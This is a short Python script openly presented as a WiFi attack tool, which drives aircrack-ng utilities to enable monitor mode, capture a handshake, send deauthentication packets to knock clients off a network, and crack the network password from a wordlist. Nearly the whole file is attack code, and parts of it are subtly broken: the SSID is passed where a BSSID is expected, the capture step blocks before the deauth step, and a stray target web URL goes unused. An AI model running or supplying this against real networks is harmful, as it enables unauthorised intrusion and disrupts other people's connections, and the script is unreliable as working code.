import sys
target = sys.argv[1] if len(sys.argv)>1 else 'https://testphp.vulnweb.com'
import subprocess

def hack_wifi(ssid, password_file):
    print(f"Starting advanced WiFi attack on SSID: {ssid}")
    
    # Start monitoring mode
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
    
    # Capture handshake
    subprocess.run(["sudo", "airodump-ng", "wlan0mon", "--bssid", ssid, "-c", "6", "-w", "capture"])
    
    # Deauthenticate to force handshake
    print("Sending deauthentication packets...")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", ssid, "wlan0mon"])
    
    # Crack password using wordlist
    print("Cracking password...")
    subprocess.run(["aircrack-ng", "-w", password_file, "capture-01.cap"])
    
    print("WiFi hacking complete.")

if __name__ == "__main__":
    target_ssid = input("Enter Target SSID: ")
    list_file = input("Enter Wordlist Path: ")
    hack_wifi(target_ssid, list_file)

